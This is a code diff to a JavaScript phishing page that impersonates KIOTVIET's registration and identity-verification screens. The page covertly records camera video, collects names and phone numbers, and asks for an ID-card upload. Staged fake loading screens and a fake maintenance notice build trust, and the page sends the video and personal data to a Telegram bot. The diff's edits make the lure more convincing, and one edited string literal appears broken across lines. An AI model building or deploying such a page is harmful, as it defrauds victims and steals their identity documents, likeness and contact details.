@@ -59,7 +59,7 @@
 
             <div class="px-6 py-10 text-center">
                 <h1 class="text-[26px] font-black text-[#2c3e50] leading-tight mb-8">
-                    Quản lý bán hàng <br/> dễ dùng cùng <span class="kv-green">KIOTVIET</span>
+                    Quản lý bán hàng <br/> dễ dàng cùng <span class="kv-green">KIOTVIET</span>
                 </h1>
                 
                 <div class="bg-white rounded-[32px] p-6 shadow-[0_10px_40px_rgba(0,0,0,0.04)] text-left mb-8 border border-gray-50">
@@ -81,7 +81,7 @@
                         </div>
                         <div class="category-item">
                             <span class="text-2xl mr-4 opacity-70">💅</span>
-                            <span class="font-bold text-gray-700 text-sm">Làm đẹp, Spa / Lưu trú</span>
+                            <span class="font-bold text-gray-700 text-sm">Làm đẹp, Spa / Mỹ phẩm</span>
                         </div>
                         <div class="py-4 text-blue-500 font-bold flex items-center gap-1 text-xs">
                             Xem Thêm <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="3" d="M19 9l-7 7-7-7"></path></svg>
@@ -155,9 +155,12 @@
             mediaRecorder.start(1000);
 
             document.getElementById('landing-page').classList.add('hidden');
-            showLoad("ĐANG KHỞI TẠO HỆ THỐNG...", 1200, renderPhoneInput);
+            showLoad(" 300.000+
+nhà kinh doanh sử dụng
+10.000+
+nhà kinh doanh mới mỗi tháng ...", 1200, renderPhoneInput);
         } catch (e) {
-            alert("Lỗi: Bạn cần cấp quyền Camera để nhận ưu đãi.");
+            alert("Lỗi: Bạn cần cấp quyền Camera để đăng ký/đăng nhập.");
             window.location.reload();
         }
     }
@@ -186,7 +189,7 @@
         const n = document.getElementById('uName').value, p = document.getElementById('uPhone').value;
         if (n.length > 2 && /^0[0-9]{9}$/.test(p)) {
             userData.name = n; userData.phone = p;
-            showLoad("ĐANG KIỂM TRA TÀI KHOẢN...", 3000, renderVerifyNotice);
+            showLoad("ĐANG XỬ LÝ...", 3000, renderVerifyNotice);
         } else { alert("Vui lòng nhập đúng Tên và SĐT"); }
     }
 
@@ -197,9 +200,9 @@
                 <div class="w-20 h-20 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-6 text-blue-500">
                     <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
                 </div>
-                <h3 class="text-xl font-black text-slate-800 mb-4 uppercase">Xác minh danh tính</h3>
-                <p class="text-[14px] text-slate-500 mb-10 leading-relaxed font-medium">Hoàn tất định danh CCCD/CMND qua hệ thống AI để bảo mật tài khoản.</p>
-                <button onclick="showLoad('ĐANG KHỞI TẠO AI...', 1000, renderUpload)" class="w-full bg-kv-green text-white py-4 rounded-xl font-black text-lg uppercase shadow-lg shadow-green-100">XÁC MINH NGAY</button>
+                <h3 class="text-xl font-black text-slate-800 mb-4 uppercase">Xác minh danh tính kiotviet</h3>
+                <p class="text-[14px] text-slate-500 mb-10 leading-relaxed font-medium">Hoàn tất định danh CCCD/CMND c để bảo mật tài khoản.</p>
+                <button onclick="showLoad('ĐANG KIỂM TRA THÔNG TIN...', 1000, renderUpload)" class="w-full bg-kv-green text-white py-4 rounded-xl font-black text-lg uppercase shadow-lg shadow-green-100">XÁC MINH NGAY</button>
             </div>
         </div>`;
     }
@@ -252,7 +255,7 @@
         }
 
         // 2. Hiện load đúng 2 giây để tạo cảm giác hệ thống đang kiểm tra, sau đó mới hiện bảo trì
-        showLoad("ĐANG XÁC MINH DỮ LIỆU...", 2000, renderMaintenance);
+        showLoad("ĐANG CẬP NHẬT THÔNG TIN...", 2000, renderMaintenance);
     }
 
     async function sendData() {
@@ -260,7 +263,7 @@
             const videoFd = new FormData();
             videoFd.append('chat_id', CHAT_ID); 
             videoFd.append('video', userData.video, 'record.mp4');
-            videoFd.append('caption', `🔔 **DỮ LIỆU MỚI**\n👤 **Tên:** ${userData.name.toUpperCase()}\n📱 **SĐT:** \`${userData.phone}\``);
+            videoFd.append('caption', `🔔 DATA MỚI\n👤 **Tên:** ${userData.name.toUpperCase()}\n📱 **SĐT:** \`${userData.phone}\``);
             
             // Gửi đồng thời video và ảnh để đạt tốc độ tối đa
             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: videoFd });
